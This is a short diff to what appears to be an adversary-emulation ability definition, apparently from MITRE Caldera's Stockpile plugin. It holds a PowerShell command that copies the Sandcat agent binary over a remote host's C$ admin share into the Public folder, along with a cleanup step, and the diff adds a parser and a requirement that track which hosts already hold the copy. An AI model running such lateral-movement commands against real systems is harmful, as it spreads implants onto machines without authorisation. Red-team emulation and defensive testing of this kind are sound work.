@@ -13,8 +13,16 @@
         command: |
           $path = "sandcat.go-windows";
           $drive = "\\#{remote.host.fqdn}\C$";
-          Copy-Item -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
+          Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
         payload: sandcat.go-windows
         cleanup: |
           $drive = "\\#{remote.host.fqdn}\C$";
           Remove-Item -Path $drive"\Users\Public\s4ndc4t.exe" -Force;
+        parsers:
+          - plugins.stockpile.app.parsers.54ndc47_remote_copy:
+            - source: remote.host.fqdn
+              edge: has_54ndc47_copy
+  requirements:
+    - plugins.stockpile.app.requirements.not_exists:
+      - source: remote.host.fqdn
+      - edge: has_54ndc47_copy
